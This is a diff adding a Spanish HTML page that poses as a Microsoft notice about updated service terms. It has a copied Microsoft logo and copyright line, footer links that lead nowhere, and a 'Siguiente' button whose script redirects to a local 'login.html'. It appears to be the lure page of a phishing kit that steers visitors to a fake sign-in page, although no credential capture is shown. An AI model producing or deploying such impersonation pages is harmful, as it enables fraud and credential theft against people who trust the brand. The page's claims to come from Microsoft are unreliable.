@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Bienvenido</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, 'BlinkMacSystemFont', 'Roboto', 'Helvetica Neue', sans-serif;
+            background-color: #f8f9fa;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 1.5rem;
+            color: #1b1b1b;
+        }
+
+        .card {
+            max-width: 500px;
+            width: 100%;
+            background-color: #ffffff;
+            border-radius: 1.25rem;
+            box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.1), 0 1px 2px rgba(0, 0, 0, 0.02);
+            overflow: hidden;
+        }
+
+        .content {
+            padding: 2rem 2rem 1.8rem 2rem;
+        }
+
+        .logo {
+            margin-bottom: 2rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .logo svg {
+            width: 108px;
+            height: auto;
+        }
+
+        h1 {
+            font-size: 1.9rem;
+            font-weight: 600;
+            letter-spacing: -0.3px;
+            margin-bottom: 1rem;
+            color: #111;
+            line-height: 1.2;
+            text-align: center;
+        }
+
+        .description {
+            font-size: 1rem;
+            line-height: 1.5;
+            color: #3b3b3b;
+            margin-bottom: 2rem;
+            font-weight: 400;
+            text-align: center;
+        }
+
+        .description strong {
+            font-weight: 600;
+            color: #000;
+        }
+
+        .divider {
+            height: 1px;
+            background-color: #e6e6e6;
+            margin: 1rem 0 1.8rem 0;
+        }
+
+        .update-info {
+            background-color: #f3f4f6;
+            border-radius: 1rem;
+            padding: 1.2rem 1.5rem;
+            margin-bottom: 2rem;
+            border-left: 4px solid #0067b8;
+        }
+
+        .update-info p {
+            font-size: 0.95rem;
+            color: #2c2c2c;
+            margin-bottom: 0.5rem;
+        }
+
+        .update-info p:last-child {
+            margin-bottom: 0;
+        }
+
+        .date-badge {
+            display: inline-block;
+            background-color: #e9ecef;
+            padding: 0.2rem 0.7rem;
+            border-radius: 30px;
+            font-size: 0.75rem;
+            font-weight: 500;
+            color: #0067b8;
+            margin-bottom: 0.75rem;
+        }
+
+        .btn-container {
+            display: flex;
+            justify-content: center;
+        }
+
+        .btn-next {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #0067b8;
+            color: white;
+            font-weight: 600;
+            font-size: 1rem;
+            padding: 0.75rem 1.8rem;
+            border-radius: 0.25rem;
+            border: none;
+            cursor: pointer;
+            transition: background-color 0.2s ease, transform 0.05s linear;
+            text-decoration: none;
+            font-family: inherit;
+            letter-spacing: 0.2px;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+        }
+
+        .btn-next:hover {
+            background-color: #0050a0;
+        }
+
+        .btn-next:active {
+            transform: scale(0.98);
+        }
+
+        .footer-links {
+            margin-top: 2.2rem;
+            font-size: 0.75rem;
+            color: #6c6c6c;
+            border-top: 1px solid #ededed;
+            padding-top: 1.5rem;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1.2rem;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .links-group {
+            display: flex;
+            gap: 1.5rem;
+            flex-wrap: wrap;
+        }
+
+        .footer-links a {
+            color: #4f4f4f;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        .footer-links a:hover {
+            color: #0067b8;
+            text-decoration: underline;
+        }
+
+        @media (max-width: 550px) {
+            .content {
+                padding: 1.5rem;
+            }
+            h1 {
+                font-size: 1.6rem;
+            }
+            .btn-next {
+                width: 100%;
+                justify-content: center;
+            }
+            .footer-links {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 0.8rem;
+            }
+            .links-group {
+                gap: 1rem;
+            }
+        }
+
+        .btn-next:focus-visible, a:focus-visible {
+            outline: 2px solid #0067b8;
+            outline-offset: 2px;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="content">
+            <!-- Logo oficial Microsoft centrado -->
+            <div class="logo" aria-label="Microsoft">
+                <svg width="110" height="27" viewBox="0 0 110 27" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <rect x="1" y="1" width="9" height="9" fill="#F25022"/>
+                    <rect x="12" y="1" width="9" height="9" fill="#7FBA00"/>
+                    <rect x="1" y="12" width="9" height="9" fill="#00A4EF"/>
+                    <rect x="12" y="12" width="9" height="9" fill="#FFB900"/>
+                    <text x="26" y="18" font-family="Segoe UI, Arial, sans-serif" font-size="12" fill="#1F1F1F">Microsoft</text>
+                </svg>
+            </div>
+
+            <!-- Título centrado -->
+            <h1>Estamos actualizando<br>nuestros términos</h1>
+            
+            <!-- Descripción centrada -->
+            <div class="description">
+                Como parte de nuestros esfuerzos por mejorar tu experiencia con <strong>Microsoft</strong>, queremos informarte que se actualizó el <strong>contrato de servicios de Microsoft</strong>.
+            </div>
+
+            <div class="update-info">
+                <div class="date-badge">Actualización importante</div>
+                <p>Estos cambios reflejan nuevas funcionalidades y mejoras en privacidad y seguridad.</p>
+                <p>Si continúas usando los servicios de Microsoft después de esa fecha, aceptas los términos actualizados.</p>
+            </div>
+
+            <!-- Contenedor para centrar el botón -->
+            <div class="btn-container">
+                <button class="btn-next" id="nextButton" onclick="cl()">Siguiente</button>
+            </div>
+
+            <div class="footer-links">
+                <div class="links-group">
+                    <a href="#" id="termsLink">Términos de uso</a>
+                    <a href="#" id="privacyLink">Aviso de privacidad</a>
+                    <a href="#" id="learnMoreLink">Más información</a>
+                </div>
+                <span>© 2026 Microsoft</span>
+            </div>
+        </div>
+    </div>
+    <script>
+        function cl() {
+            location.href="login.html"
+        }
+    </script>
+</body>
+</html>
